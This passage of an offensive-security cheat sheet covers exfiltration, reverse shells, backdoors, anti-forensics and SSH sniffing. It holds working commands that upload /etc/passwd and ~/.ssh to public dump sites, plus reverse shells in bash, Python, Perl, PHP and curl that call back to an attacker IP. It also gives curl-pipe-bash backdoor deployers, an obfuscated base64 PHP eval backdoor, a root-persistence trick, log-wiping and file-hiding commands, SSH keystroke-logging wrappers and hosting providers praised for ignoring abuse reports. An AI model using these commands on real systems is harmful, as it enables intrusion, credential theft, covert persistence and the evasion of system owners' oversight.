Use [gs-netcat](https://github.com/hackerschoice/gsocket) and encapsulate the sftp protocol within. Allows access to hosts behind NAT/Firewall.

```sh
gs-netcat -s MySecret -l -e /usr/lib/sftp-server         # Host behind NAT/Firewall
```

From your workstation execute this command to connect to the SFTP server:
```sh
export GSOCKET_ARGS="-s MySecret"                        # Workstation
sftp -D gs-netcat                                        # Workstation
```

Or to DUMP a single file:
```sh
# On the sender
gs-netcat -l <"FILENAME" # Will output a SECRET used by the receiver

# On the receiver
gs-netcat >"FILENAME"  # When prompted, enter the SECRET from the sender
```

<a id="http"></a>
### 4.v. File transfer - using HTTPs

#### Download from Server to Receiver:
```sh
## Spawn a temporary HTTP server and share the current working directory.
python -m http.server 8080
```

```sh
## Request a temporary tunnel on a public domain
cloudflared tunnel -url localhost:8080
```
Receiver: Access the URL from any browser to view/download the remote file system.

#### Upload from Sender to Receiver:
```
## Spawn an upload server on the Receiver:
pip install uploadserver
python -m uploadserver
```

```sh
## Make it available through a public domain
cloudflared tunnel -url localhost:8000
```

On the Sender:
```sh
curl -X POST  https://CF-URL-CHANGE-ME.trycloudflare.com/upload -F 'files=@myfile.txt'
```

<a id="burl"></a>
### 4.vi. File transfer without curl

Using bash, download only:
```sh
burl() {
    IFS=/ read -r proto x host query <<<"$1"
    exec 3<>"/dev/tcp/${host}/${PORT:-80}"
    echo -en "GET /${query} HTTP/1.0\r\nHost: ${host}\r\n\r\n" >&3
    (while read -r l; do echo >&2 "$l"; [[ $l == $'\r' ]] && break; done && cat ) <&3
    exec 3>&-
}
# burl http://ipinfo.io
# PORT=31337 burl http://37.120.235.188/blah.tar.gz >blah.tar.gz
```

<a id="trans"></a>
### 4.vii. File transfer using a public dump

Cut & paste into your bash:
```sh
transfer() {
    [[ $# -eq 0 ]] && { echo -e >&2 "Usage:\n    transfer [file/directory]\n    transfer [name] <FILENAME"; return 255; }
    [[ ! -t 0 ]] && { curl -SsfL --progress-bar -T "-" "https://transfer.sh/${1}"; return; }
    [[ ! -e "$1" ]] && { echo -e >&2 "Not found: $1"; return 255; }
    [[ -d "$1" ]] && { (cd "${1}/.."; tar cfz - "${1##*/}")|curl -SsfL --progress-bar -T "-" "https://transfer.sh/${1##*/}.tar.gz"; return; }
    curl -SsfL --progress-bar -T "$1" "https://transfer.sh/${1##*/}"
}
```

then upload a file or a directory:
```sh
transfer /etc/passwd  # A single file
transfer ~/.ssh       # An entire directory
(curl ipinfo.io; hostname; uname -a; cat /proc/cpuinfo) | transfer "$(hostname)"
```
A list of our [favorite public upload sites](#cloudexfil).

<a id="rsync"></a>
### 4.viii. File transfer - using rsync

Ideal for synchonizing large amount of directories or re-starting broken transfers. The example transfers the directory '*warez*' to the Receiver using a single TCP connection from the Sender to the Receiver.

Receiver:
```posh
echo -e "[up]\npath=upload\nread only=false\nuid=$(id -u)\ngid=$(id -g)" >r.conf
mkdir upload
rsync --daemon --port=31337 --config=r.conf --no-detach
```

Sender:
```posh
rsync -av warez rsync://1.2.3.4:31337/up
```

The same encrypted (OpenSSL):

Receiver:
```posh
openssl req -subj '/CN=thc/O=EXFIL/C=XX' -new -newkey rsa:2048 -sha256 -days 14 -nodes -x509 -keyout ssl.key -out ssl.crt
cat ssl.key ssl.crt >ssl.pem
rm -f ssl.key ssl.crt
mkdir upload
socat OPENSSL-LISTEN:31337,reuseaddr,fork,cert=ssl.pem,cafile=ssl.pem EXEC:"rsync --server -logtprR --safe-links --partial upload"
```

Sender:
```posh
# Copy the ssl.pem from the Receiver to the Sender and send directory named 'warez'
# Using rsync + socat-ssl
rsync -ahPRv -e "bash -c 'socat - OPENSSL-CONNECT:1.2.3.4:31337,cert=ssl.pem,cafile=ssl.pem,verify=0' #" -- ./warez  0:

# Using rsync + openssl
rsync -ahPRv -e "bash -c 'openssl s_client -connect 1.2.3.4:31337 -servername thc -cert ssl.pem -CAfile ssl.pem -quiet 2>/dev/null' #" -- ./warez  0:
```

Rsync can be combined to exfil via [https / cloudflared raw TCP tunnels](https://iq.thc.org/tunnel-via-cloudflare-to-any-tcp-service).  
(To exfil from Windows, use the rsync.exe from the [gsocket windows package](https://github.com/hackerschoice/binary/raw/main/gsocket/bin/gs-netcat_x86_64-cygwin_full.zip)). A noisier solution is [syncthing](https://syncthing.net/).

<a id="webdav"></a>
### 4.ix. File transfer - using WebDAV

On the receiver (e.g. segfault.net) start a Cloudflare-Tunnel and WebDAV:
```sh
cloudflared tunnel --url localhost:8080 &
# [...]
# +--------------------------------------------------------------------------------------------+
# |  Your quick Tunnel has been created! Visit it at (it may take some time to be reachable):  |
# |  https://example-foo-bar-lights.trycloudflare.com                                          |
# +--------------------------------------------------------------------------------------------+
# [...]
wsgidav --port=8080 --root=.  --auth=anonymous
```

On another server:
```sh
# Upload a file to your workstation
curl -T file.dat https://example-foo-bar-lights.trycloudflare.com
# Create a directory remotely
curl -X MKCOL https://example-foo-bar-lights.trycloudflare.com/sources
# Create a directory hirachy remotely
find . -type d | xargs -I{} curl -X MKCOL https://example-foo-bar-lights.trycloudflare.com/sources/{}
# Upload all *.c files (in parallel):
find . -name '*.c' | xargs -P10 -I{} curl -T{} https://example-foo-bar-lights.trycloudflare.com/sources/{}
```

Access the share from Windows (to drag & drop files) in File Explorer:
```
\\example-foo-bar-lights.trycloudflare.com@SSL\sources
```

Or mount the WebDAV share on Windows (Z:/):
```
net use * \\example-foo-bar-lights.trycloudflare.com@SSL\sources
```

<a id="tg"></a>
### 4.x. File transfer to Telegram

There are [zillions of upload services](#cloudexfil) but TG is a neat alternative. Get a _TG-Bot-Token_ from the [TG BotFather](https://www.siteguarding.com/en/how-to-get-telegram-bot-api-token). Then create a new TG group and add your bot to the group. Retrieve the _chat_id_ of that group:
```sh
curl -s "https://api.telegram.org/bot<TG-BOT-TOKEN>/getUpdates" | jq -r '.result[].message.chat.id' | uniq
# If you get only {"ok":true,"result":[]} then remove and add the bot again.
```

```sh
# Upload file.zip straight into the group chat:
curl -sF document=@file.zip "https://api.telegram.org/bot<TG-BOT-TOKEN>/sendDocument?chat_id=<TG-CHAT-ID>"
```

---
<a id="reverse-shell"></a>
## 5. Reverse Shell / Dumb Shell
<a id="reverse-shell-gs-netcat"></a>
**5.i.a. Reverse shell with gs-netcat (encrypted)**

Use [gsocket deploy](https://gsocket.io/deploy). It spawns a fully functioning PTY reverse shell and using the Global Socket Relay network. It uses 'password hashes' instead of IP addresses to connect. This means that you do not need to run your own Command & Control server for the backdoor to connect back to. If netcat is a swiss army knife than gs-netcat is a german battle axe :>

```sh
X=ExampleSecretChangeMe bash -c "$(curl -fsSL https://gsocket.io/x)"
# or X=ExampleSecretChangeMe bash -c "$(wget --no-verbose -O- https://gsocket.io/x)"
```

To connect to the shell from your workstation:
```sh
S=ExampleSecretChangeMe bash -c "$(curl -fsSL https://gsocket.io/x)"
# or gs-netcat -s ExampleSecretChangeMe -i
# Add -T to tunnel through TOR
```

<a id="reverse-shell-bash"></a>
**5.i.b. Reverse shell with Bash**

Start netcat to listen on port 1524 on your system:
```sh
nc -nvlp 1524
```

On the remote system, this command will connect back to your system (IP = 3.13.3.7, Port 1524) and give you a shell prompt:
```sh
# If the current shell is Bash already:
(bash -i &>/dev/tcp/3.13.3.7/1524 0>&1) &
# If the current shell is NOT Bash then we need:
bash -c '(exec bash -i &>/dev/tcp/3.13.3.7/1524 0>&1) &'
# or hide the bash process as 'kqueue'
bash -c '(exec -a kqueue bash -i &>/dev/tcp/3.13.3.7/1524 0>&1) &'
```

<a id="curlshell"></a>
**5.i.c. Reverse shell with cURL (encrypted)**

Use [curlshell](https://github.com/SkyperTHC/curlshell). This also works through proxies and when direct TCP connection to the outside world is prohibited:
```sh
# Generate SSL keys:
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -sha256 -days 3650 -nodes -subj "/CN=THC"
# Start your listening server:
./curlshell.py --certificate cert.pem --private-key key.pem --listen-port 8080
```
```sh
# On the target:
curl -skfL https://3.13.3.7:8080 | bash
```

<a id="curltelnet"></a>
**5.i.d Reverse shell with cURL (cleartext)**

Start ncat to listen for multiple connections:
```sh
ncat -kltv 1524
```
```sh
# On the target:
C="curl -Ns telnet://3.13.3.7:1524"; $C </dev/null 2>&1 | sh 2>&1 | $C >/dev/null
```

<a id="sslshell"></a>
**5.i.e. Reverse shell with OpenSSL (encrypted)**

```sh
# Generate SSL keys:
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -sha256 -days 3650 -nodes -subj "/CN=THC"
# Start your listening server:
openssl s_server -port 1524 -cert cert.pem -key key.pem
```
```sh
# On the target:
{ openssl s_client -connect 3.13.3.7:1524 -quiet </dev/fd/3 3>&- | sh 2>&3 >&3 3>&- ; } 3>&1 | :
```

<a id="reverse-shell-no-bash"></a>
**5.i.f. Reverse shell without /dev/tcp**

Embedded systems do not always have Bash and the */dev/tcp/* trick will not work. There are many other ways (Python, PHP, Perl, ..). Our favorite is to upload netcat and use netcat or telnet:

On the remote system:

```sh
nc -e /bin/sh -vn 3.13.3.7 1524
```

Variant if *'-e'* is not supported:
```sh
{ nc -vn 3.13.3.7 1524 </dev/fd/3 3>&- | sh 2>&3 >&3 3>&- ; } 3>&1 | :
```

* On modern shells this can be shortened to `{ nc 3.13.3.7 1524 </dev/fd/2|sh;} 2>&1|:`. (*thanks IA_PD*).  
* The `| :` trick wont work on C-Shell/tcsh (FreeBSD), orignal Bourne shell (Solaris) or Korn shell (AIX). Use `mkfifo` instead.

Variant for older */bin/sh*:
```sh
mkfifo /tmp/.io; sh -i 2>&1 </tmp/.io | nc -vn 3.13.3.7 1524 >/tmp/.io
```

Telnet variant:
```sh
mkfifo /tmp/.io; sh -i 2>&1 </tmp/.io | telnet 3.13.3.7 1524 >/tmp/.io
```

Telnet variant when mkfifo is not supported (Ulg!):
```sh
touch /tmp/.fio; tail -f /tmp/.fio | sh -i | telnet 3.13.3.7 31337 >/tmp/.fio
```
Note: Dont forget to `rm /tmp/.fio` after login.

<a id="revese-shell-remote-moe"></a>
**5.i.g. Reverse shell with remote.moe and ssh (encrypted)**

It is possible to tunnel raw TCP (e.g bash reverse shell) through [remote.moe](https://remote.moe):

On your workstation:
```sh
# First Terminal - Create a remote.moe tunnel to your workstation
ssh-keygen -q -t rsa -N "" -f .r  # New key creates a new remote.moe-address
ssh -i .r -R31337:0:8080 -o StrictHostKeyChecking=no nokey@remote.moe; rm -f .r
# Note down the 'remote.moe' address which will look something like
# uydsgl6i62nrr2zx3bgkdizlz2jq2muplpuinfkcat6ksfiffpoa.remote.moe

# Second Terminal - start listening for the reverse shell
nc -vnlp 8080
```

On the target(needs SSH and Bash):
```sh
bash -c '(killall ssh; rm -f /tmp/.r; ssh-keygen -q -t rsa -N "" -f /tmp/.r; ssh -i /tmp/.r -o StrictHostKeyChecking=no -L31338:uydsgl6i62nrr2zx3bgkdizlz2jq2muplpuinfkcat6ksfiffpoa.remote.moe:31337 -Nf remote.moe;  bash -i &>/dev/tcp/0/31338 0>&1 &)'
```

On the target (alternative; needs ssh, bash and mkfifo):
```sh
rm -f /tmp/.p /tmp/.r; ssh-keygen -q -t rsa -N "" -f /tmp/.r && mkfifo /tmp/.p && (bash -i</tmp/.p  2>1 |ssh -i /tmp/.r -o StrictHostKeyChecking=no -W uydsgl6i62nrr2zx3bgkdizlz2jq2muplpuinfkcat6ksfiffpoa.remote.moe:31337 remote.moe>/tmp/.p &)
```

<a id="reverse-shell-python"></a>
**5.i.h. Reverse shell with Python**
```sh
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("3.13.3.7",1524));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

<a id="reverse-shell-perl"></a>
**5.i.i. Reverse shell with Perl**

```sh
# method 1
perl -e 'use Socket;$i="3.13.3.7";$p=1524;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
# method 2
perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"3.13.3.7:1524");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'
```
<a id="reverse-shell-php"></a>
**5.i.j. Reverse shell with PHP**

```sh
php -r '$sock=fsockopen("3.13.3.7",1524);exec("/bin/bash -i <&3 >&3 2>&3");'
```

<a id="reverse-shell-upgrade"></a>
<a id="reverse-shell-pty"></a>
**5.ii.a. Upgrade a reverse shell to a PTY shell**

Any of the above reverse shells are limited. For example *sudo bash* or *top* will not work. To make these work we have to upgrade the shell to a real PTY shell:

```sh
# Using script
exec script -qc /bin/bash /dev/null  # Linux
exec script -q /dev/null /bin/bash   # BSD
```

```sh
# Using python
exec python -c 'import pty; pty.spawn("/bin/bash")'
```

<a id="reverse-shell-interactive"></a>
**5.ii.b. Upgrade a reverse shell to a fully interactive shell**

...and if we also like to use Ctrl-C etc then we have to go all the way and upgrade the reverse shell to a real fully colorful interactive shell:

```sh
# On the target host spwan a PTY using any of the above examples:
python -c 'import pty; pty.spawn("/bin/bash")'
# Now Press Ctrl-Z to suspend the connection and return to your own terminal.
```

```
# On your terminal execute:
stty raw -echo opost; fg
```

```
# On target host
export SHELL=/bin/bash
export TERM=xterm-256color
reset
stty rows 24 columns 120
# Pimp up your prompt
PS1='{THC} USERS=$(who | wc -l) LOAD=$(cut -f1 -d" " /proc/loadavg) PS=$(ps -e --no-headers|wc -l) \[\e[36m\]\u\[\e[m\]@\[\e[32m\]\h:\[\e[33;1m\]\w \[\e[0;31m\]\$\[\e[m\] '
```

<a id="reverse-shell-socat"></a>
**5.ii.c. Reverse shell with socat (fully interactive)**

...or install socat and get it done without much fiddling about:

```sh
# on attacker's host (listener)
socat file:`tty`,raw,echo=0 tcp-listen:1524
# on target host (reverse shell)
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:3.13.3.7:1524
```

---
<a id="backdoor"></a>
## 6. Backdoors

Mostly we use gs-netcat's automated deployment script: [https://www.gsocket.io/deploy](https://www.gsocket.io/deploy).
```sh
bash -c "$(curl -fsSLk https://gsocket.io/x)"
```
or
```sh
bash -c "$(wget --no-check-certificate -qO- https://gsocket.io/x)"
```

or deploy gsocket by running their own deployment server:
```sh
LOG=results.log bash -c "$(curl -fsSL https://gsocket.io/xs)"  # Notice '/xs' instead of '/x'
```

<a id="backdoor-background-reverse-shell"></a>
**6.i. Background reverse shell**

A reverse shell that keeps trying to connect back to us every 360 seconds (indefinitely). Often used until a real backdoor can be deployed and guarantees easy re-entry to a system in case our connection gets disconnected. 

```sh
setsid bash -c 'while :; do bash -i &>/dev/tcp/3.13.3.7/1524 0>&1; sleep 360; done' &>/dev/null
```

or the user's *~/.profile* (also stops multiple instances from being started):
```sh
fuser /dev/shm/.busy &>/dev/null || nohup /bin/bash -c 'while :; do touch /dev/shm/.busy; exec 3</dev/shm/.busy; bash -i &>/dev/tcp/3.13.3.7/1524 0>&1 ; sleep 360; done' &>/dev/null &
```

<a id="backdoor-auth-keys"></a>
**6.ii. authorized_keys**

Add your ssh public key to */root/.ssh/authorized_keys*. It's the most reliable backdoor ever :>

* It survives reboots.
* It even survives re-installs. Admins have been known to make a backup of authorized_keys and then put it straight back onto the newly installed system.
* We have even seen our key being copied to other companies!

Tip: Change the name at the end of the ssh public keyfile to something obscure like *backup@ubuntu* or the admin's real name:
```
$ cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCktFkgm40GDkqYwJkNZVb+NLqYoUNSPVPLx0VDbJM0
[...]
u1i+MhhnCQxyBZbrWkFWyzEmmHjZdAZCK05FRXYZRI9yadmvo7QKtRmliqABMU9WGy210PTOLMltbt2C
c3zxLNse/xg0CC16elJpt7IqCFV19AqfHnK4YiXwVJ+M+PyAp/aEAujtHDHp backup@ubuntu
```
<a id="backdoor-network"></a>
**6.iii. Remote Access to an entire network**

Install [gs-netcat](https://github.com/hackerschoice/gsocket). It creates a SOCKS exit-node on the Host's private LAN which is accessible through the Global Socket Relay Network without the need to run your own relay-server (e.g. access the remote private LAN directly from your workstation):

```sh
gs-netcat -l -S       # compromised Host
```

Now from your workstation you can connect to ANY host on the Host's private LAN:
```sh
gs-netcat -p 1080    # Your workstation.

# Access route.local:22 on the Host's private LAN from your Workstation:
socat -  "SOCKS4a:127.1:route.local:22"
```
Read [Use any tool via Socks Proxy](#scan-proxy).

Other methods:
* [Gost/Cloudflared](https://iq.thc.org/tunnel-via-cloudflare-to-any-tcp-service) - our very own article
* [Reverse Wireguard](https://thc.org/segfault/wireguard) - from segfault.net to any (internal) network.

<a id="carriage-return-backdoor"></a>
**6.iv. Smallest PHP Backdoor**

Add this line to the beginning of any PHP file:
```php
<?php $i=base64_decode("aWYoaXNzZXQoJF9HRVRbMF0pKXtlY2hvIGAkX0dFVFswXWA7ZXhpdDt9");eval($i);?>
```
(Thanks @dono for making this 3 bytes smaller than the smallest)

Test the backdoor:
```sh
### 1. Optional: Start a test PHP server
cd /var/www/html && php -S 127.0.0.1:8080
### Without executing a command
curl http://127.0.0.1:8080/test.php
### With executing a command
curl http://127.0.0.1:8080/test.php -d 0="ps fax; uname -mrs; id"
```

<a id="ld-backdoor"></a>
**6.v. Local Root Backdoor**

Stay root once you got root
```bash
### Execute as root user
setcap cap_setuid+ep /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
```
Become root
```bash
### Execute as non-root user
/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 /usr/bin/python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'
```

---
<a id="shell-hacks"></a>
## 7. Shell Hacks
<a id="shred"></a>
**7.i. Shred & Erase a file**

```sh
shred -z foobar.txt
```

```sh
## SHRED without shred command
shred()
{
    [[ -z $1 || ! -f "$1" ]] && { echo >&2 "shred [FILE]"; return 255; }
    dd bs=1k count=$(du -sk ${1:?} | cut -f1) if=/dev/urandom >"$1"
    rm -f "${1:?}"
}
shred foobar.txt
```
Note: Or deploy your files in */dev/shm* directory so that no data is written to the harddrive. Data will be deleted on reboot.

Note: Or delete the file and then fill the entire harddrive with /dev/urandom and then rm -rf the dump file.

<a id="restore-timestamp"></a>
**7.ii. Restore the date of a file**

Let's say you have modified */etc/passwd* but the file date now shows that */etc/passwd* has been modifed. Use *touch* to change the file data to the date of another file (in this example, */etc/shadow*)

```sh
touch -r /etc/shadow /etc/passwd
```

<a id="shell-clean-logs"></a>
**7.iii. Clear logfile**

This will reset the logfile to 0 without having to restart syslogd etc:
```sh
>/var/log/auth.log # or on old shells: cat /dev/null >/var/log/auth.log
```

This will remove any line containing the IP `1.2.3.4` from the log file:
```sh
#DEL=thc.org
#DEL=${SSH_CLIENT%% *}
DEL=1.2.3.4
LOG=/var/log/auth.log
IFS="" a=$(sed "/${DEL}/d" <"${LOG}") && echo "$a">"${LOG}"
```

<a id="shell-hide-files"></a>
**7.iv. Hide files from that User without root privileges**

Our favorite working directory is */dev/shm/*. This location is volatile memory and will be lost on reboot. NO LOGZ == NO CRIME.

Hiding permanent files:

Method 1:
```sh
alias ls='ls -I system-dev'
```

This will hide the directory *system-dev* from the *ls* command. Place in User's *~/.profile* or system wide */etc/profile*.

Method 2:
Tricks from the 80s. Consider any directory that the admin rarely looks into (like */boot/.X11/..* or so):
```sh
mkdir '...'
cd '...'
```

Method 3:
Unix allows filenames with about any ASCII character but 0x00. Try tab (*\t*). Happens that most Admins do not know how to cd into any such directory.
```sh
mkdir $'\t'
cd $'\t'
```

<a id="linux-info"></a>
**7.v. Find out Linux Distro**

```sh
# Find out Linux Distribution
uname -a; lsb_release -a 2>/dev/null; cat /etc/*release /etc/issue* /proc/version /etc/hosts 2>/dev/null
```

```sh
# Speed check the system
curl -sL bench.sh | bash
# Another speed check:  
# curl -sL yabs.sh | bash
```

<a id="suid"></a>
**7.vi. Find +s files / Find writeable directory**

Find all suid/sgid binaries:
```
find  / -xdev -type f -perm /6000  -ls 2>/dev/null
```

Find all writeable directories:
```sh
wfind() {
    local arr dir

    arr=("$@")
    while [[ ${#arr[@]} -gt 0 ]]; do
        dir=${arr[${#arr[@]}-1]}
        unset 'arr[${#arr[@]}-1]'
        find "$dir"  -maxdepth 1 -type d -writable -ls 2>/dev/null
        IFS=$'\n' arr+=($(find "$dir" -mindepth 1 -maxdepth 1 -type d ! -writable 2>/dev/null))
    done
}
# Usage: wfind /
# Usage: wfind /etc /var /usr 
```

---
<a id="crypto"></a>
## 8. Crypto
<a id="gen-password"></a>
**8.i. Generate quick random Password**

Good for quick passwords without human element.

```sh
openssl rand -base64 24
```

If `openssl` is not available then we can also use `head` to read from `/dev/urandom`.

```sh
head -c 32 < /dev/urandom | xxd -p -c 32
```

or make it alpha-numeric

```sh
head -c 32 < /dev/urandom | base64 | tr -dc '[:alnum:]' | head -c 16
```

<a id="crypto-filesystem"></a>
**8.ii.a. Linux transportable encrypted filesystems - cryptsetup**

Create a 256MB large encrypted file system. You will be prompted for a password.

```sh
dd if=/dev/urandom of=/tmp/crypted bs=1M count=256 iflag=fullblock
cryptsetup luksFormat /tmp/crypted
mkfs.ext3 /tmp/crypted
```

Mount:

```sh
losetup -f
losetup /dev/loop0 /tmp/crypted
cryptsetup open /dev/loop0 crypted
mount -t ext3 /dev/mapper/crypted /mnt/crypted
```

Store data in `/mnt/crypted`, then unmount:

```sh
umount /mnt/crypted
cryptsetup close crypted
losetup -d /dev/loop0
```
<a id="encfs"></a>
**8.ii.b. Linux transportable encrypted filesystems - EncFS**

Create ```.sec``` and store the encrypted data in ```.raw```:
```sh
mkdir .raw .sec
encfs --standard  "${PWD}/.raw" "${PWD}/.sec"
```

unmount:
```sh
fusermount -u .sec
```

<a id="encrypting-file"></a>
**8.iii Encrypting a file**

Encrypt your 0-Days and log files before transfering them - please. (and pick your own password):

```sh
# Encrypt
openssl enc -aes-256-cbc -pbkdf2 -k fOUGsg1BJdXPt0CY4I <input.txt >input.txt.enc
```

```sh
# Decrypt
openssl enc -d -aes-256-cbc -pbkdf2 -k fOUGsg1BJdXPt0CY4I <input.txt.enc >input.txt
```

---
<a id="ssh-sniffing"></a>
## 9. SSH Sniffing
<a id="ssh-sniffing-script"></a>
**9.i Sniff a user's SHELL session with script**

A method to log the shell session of a user (who logged in via SSH).

The tool 'script' has been part of Unix for decades. Add 'script' to the user's .profile. The user's keystrokes and session will be recorded to ~/.ssh-log.txt the next time the user logs in:
```sh
echo 'exec script -qc /bin/bash ~/.ssh-log.txt' >>~/.profile
```
Consider using [zap-args](#bash-hide-arguments) to hide the the arguments and /dev/tcp/3.13.3.7/1524 as an output file to log to a remote host.

<a id="ssh-sniffing-strace"></a>
**9.ii Sniff a user's outgoing SSH session with strace**
```sh
strace -e trace=read -p <PID> 2>&1 | while read x; do echo "$x" | grep '^read.*= [1-9]$' | cut -f2 -d\"; done
```
Dirty way to monitor a user who is using *ssh* to connect to another host from a computer that you control.


<a id="ssh-sniffing-wrapper"></a>
**9.iii. Sniff a user's outgoing SSH session with a wrapper script**

Even dirtier method in case */proc/sys/kernel/yama/ptrace_scope* is set to 1 (strace will fail on already running SSH sessions)

Create a wrapper script called 'ssh' that executes strace + ssh to log the session:
<details>
  <summary>Show wrapper script - CLICK HERE</summary>

```sh
# Cut & Paste the following into a bash shell:
# Add a local path to the PATH variable so our 'ssh' is executed instead of the real ssh:
echo 'PATH=~/.local/bin:$PATH #0xFD0E' >>~/.profile

# Create a log directory and our own ssh binary
mkdir -p ~/.local/bin ~/.local/logs

cat <<__EOF__ >~/.local/bin/ssh
#! /bin/bash
strace -e trace=read -I 1 -o '! ~/.local/bin/ssh-log \$\$' /usr/bin/ssh \$@
__EOF__

cat <<__EOF__ >~/.local/bin/ssh-log
#! /bin/bash
grep -F 'read(4' | cut -f2 -d\\" | while read -r x; do
        [[ \${#x} -gt 5 ]] && continue 
        [[ \${x} == +(\\\\n|\\\\r) ]] && { echo ""; continue; }
        echo -n "\${x}"
done >\$HOME/.local/logs/ssh-log-"\${1}"-\`date +%s\`.txt
__EOF__

chmod 755 ~/.local/bin/ssh ~/.local/bin/ssh-log
. ~/.profile

echo -e "\033[1;32m***SUCCESS***.
Logfiles stored in ~/.local/.logs/.
To uninstall cut & paste this\033[0m:\033[1;36m
  grep -v 0xFD0E ~/.profile >~/.profile-new && mv ~/.profile-new ~/.profile
  rm -rf ~/.local/bin/ssh ~/.local/bin/ssh-log ~/.local/logs/ssh-log*.txt
  rmdir ~/.local/bin ~/.local/logs ~/.local &>/dev/null \033[0m"
```
(thanks to Gerald for testing this)
</details>

The SSH session will be sniffed and logged to *~/.ssh/logs/* the next time the user logs into his shell and uses SSH.

<a id="ssh-sniffing-sshit"></a>
**9.iv Sniff a user's outgoing SSH session using SSH-IT**

The easiest way is using [https://www.thc.org/ssh-it/](https://www.thc.org/ssh-it/).

```sh
bash -c "$(curl -fsSL https://thc.org/ssh-it/x)"
```

<a id="hijak"></a>
**9.v Hijak / Take-over a running SSH session**  

Use [https://github.com/nelhage/reptyr](https://github.com/nelhage/reptyr) to take over an existing SSH session:
```sh
ps ax -o pid,ppid,cmd | grep 'ssh '
./reptyr -T <SSH PID>
### or: ./reptyr -T $(pidof -s ssh)
### Must use '-T' or otherwise the original user will see that his SSH process gets suspended.
```

---
<a id="vpn-shell"></a>
## 10. VPN & Shells
<a id="shell"></a>
**10.i. Disposable Root Servers**

```console
$ ssh root@segfault.net # Use password 'segfault'
```

https://thc.org/segfault

<a id="vpn"></a>
**10.ii. VPN/VPS/Proxies**

Trusted VPN Providers
1. https://www.mullvad.net
1. https://www.cryptostorm.is
1. https://proton.me - Offers FREE VPN
1. https://vpn.fail - Run by volunteers

Virtual Private Servers
1. https://www.hetzner.com - Cheap
2. https://hivecloud.pw - No KYC. Bullet Proof. Accepts Crypto.
1. https://dmzhost.co - Ignore most abuse requests
2. https://alexhost.com - No KYC. Bullet Proof. DMCA free zone
3. https://basehost.eu - Ignores court orders
4. https://buyvm.net - Warez best friend
5. https://serverius.net - Used by gangsters
6. https://1984.hosting - Privacy
7. https://bithost.io - Reseller for DigitalOcean, Linode, Hetzner and Vultr (accepts Crypto)
8. https://www.privatelayer.com - Swiss based.

See [other KYC Free Services](https://kycnot.me/) ([.onion](http://kycnotmezdiftahfmc34pqbpicxlnx3jbf5p7jypge7gdvduu7i6qjqd.onion/))

Proxies (we dont use any of those)
1. [V2Ray Proxies](https://github.com/mahdibland/V2RayAggregator)
2. [Hola Proxies](https://github.com/snawoot/hola-proxy)
3. [Zaeem's Free Proxy List](https://github.com/Zaeem20/FREE_PROXIES_LIST)
4. [Proxy Broker 2](https://github.com/bluet/proxybroker2)
5. [proxyscrape.com](https://api.proxyscrape.com/v2/?request=displayproxies&protocol=all&timeout=750&country=all)
6. [my-proxy.com](https://www.my-proxy.com)
7. [getfreeproxylists.blogspot.com](https://getfreeproxylists.blogspot.com/)
8. [proxypedia.org](https://proxypedia.org/)
9. [socks-proxy.net](https://socks-proxy.net/)
10. [Segfault](https://www.thc.org/segfault): `curl -x socks5h://$(PROXY) ipinfo.io` - selects a random proxy for every request

Many other services (for free)  
1. https://free-for.dev/

---
<a id="osint"></a>
## 11. Intelligence Gathering

| OSINT Hacker Tools ||
| --- | --- |
| https://osint.sh | Free. Subdomain Finder, DNS History, Public S3 Buckets, Reverse IP, Certificate Search and much more |
| https://cli.fyi | Free. curl/json interface to many services. Try `curl cli.fyi/me` or `curl cli.fyi/thc.org`. |
| https://hackertarget.com/ip-tools/ | Free OSINT Service (Reverse IP, MTR, port scan, CMS scans, Vulnerability Scans, API support) |
| https://account.shodan.io/billing/tour | Open Port DB & DNS Lookup from around the world |
| https://dnsdumpster.com/ | Domain Recon Tool |
| https://crt.sh/ | TLS Certificate Search |
| https://archive.org/web/ | Historical view of websites |
| https://www.farsightsecurity.com/solutions/dnsdb/ | DNS search (not free) |
| https://wigle.net/ | Wireless Network Mapper |
| https://radiocells.org/ | Cell Tower Informations |
| https://www.shodan.io/ | Search Engine to find devices & Banners (not free) |
| https://spur.us/context/me | IP rating `https://spur.us/context/<IP>` |
| http://drs.whoisxmlapi.com | Reverse Whois Lookup (not free) |
| https://www.abuseipdb.com | IP abuse rating |

| OSINT for Detectives ||
| --- | --- |
| https://start.me/p/rx6Qj8/nixintel-s-osint-resource-list | Nixintel's OSINT Resource List |
| https://github.com/jivoi/awesome-osint | Awesome OSINT list |
| https://cipher387.github.io/osint_stuff_tool_collection/ | OSINT tools collection |
| https://osintframework.com/ | Many OSINT tools |

| OSINT Databases ||
| --- | --- |
| https://data.ddosecrets.com/ | Database Dumps

---
<a id="misc"></a>
## 12. Miscellaneous
<a id="tools"></a>
**12.i. Tools of the trade**

Comms
1. [CryptoStorm Email](https://www.cs.email/) - Disposable emails (send & receive). (List of [Disposable-email-services](https://github.com/AnarchoTechNYC/meta/wiki/Disposable-email-services])).
1. [Temp-Mail](https://temp-mail.org/en/) - Disposable email service with great Web GUI. Receive only.
2. [tuta.io](https://tuta.io) or [ProtonMail](https://pm.me)/[.onion](https://protonmailrmez3lotccipshtkleegetolb73fuirgj7r4o4vfu7ozyd.onion/) - Free & Private email
1. [Quackr.Io](https://quackr.io/) - Disposable SMS/text messages (List of [Disposable-SMS-services](https://github.com/AnarchoTechNYC/meta/wiki/Disposable-SMS-services)).
